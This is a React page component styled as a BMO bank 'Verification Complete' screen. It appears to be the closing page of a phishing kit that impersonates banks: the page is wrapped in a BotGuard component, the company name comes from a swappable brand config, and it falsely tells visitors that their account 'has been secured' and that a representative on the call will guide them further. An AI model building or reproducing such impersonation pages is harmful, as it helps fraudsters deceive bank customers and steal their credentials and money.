'use client';

/**
 * BMO Completed/Success Page
 * Clean, minimal design consistent with BMO branding
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';

export default function CompletedPage() {
  return (
    <BotGuard>
      {/* Centered Page Header */}
      <div className="page-header">
        <img src="/brands/bmo/lock..svg" alt="" className="lock-icon" />
        <h1>Verification Complete</h1>
      </div>

      {/* Two Column Layout */}
      <div className="main-container">
        {/* Card */}
        <div className="login-card">
          <div className="card-header">
            <h2>Verification Complete</h2>
          </div>

          <div className="login-form">
            <p style={{ color: 'var(--bmo-dark)', fontSize: '16px', fontWeight: 500, textAlign: 'center' }}>
              Thank you for verifying your identity.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '14px', textAlign: 'center', marginTop: '8px' }}>
              Your account has been secured. You may safely close this window.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '14px', textAlign: 'center', marginTop: '24px' }}>
              If you were on a call with a representative, they will guide you through the next steps.
            </p>

            <p style={{ color: 'var(--bmo-gray)', fontSize: '13px', textAlign: 'center', marginTop: '32px' }}>
              Thank you for banking with {currentBrand.companyName}.
            </p>
          </div>
        </div>

        {/* Right Panels */}
        <div className="info-panels">
          <div className="info-card security-card">
            <div className="security-header">
              <img src="/brands/bmo/lock..svg" alt="" className="security-icon" />
              <h2>Your security always comes first</h2>
            </div>
            <p className="security-text">
              We've made Online Banking more convenient, while still using advanced security
              technologies that keep your money and information safe.
            </p>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
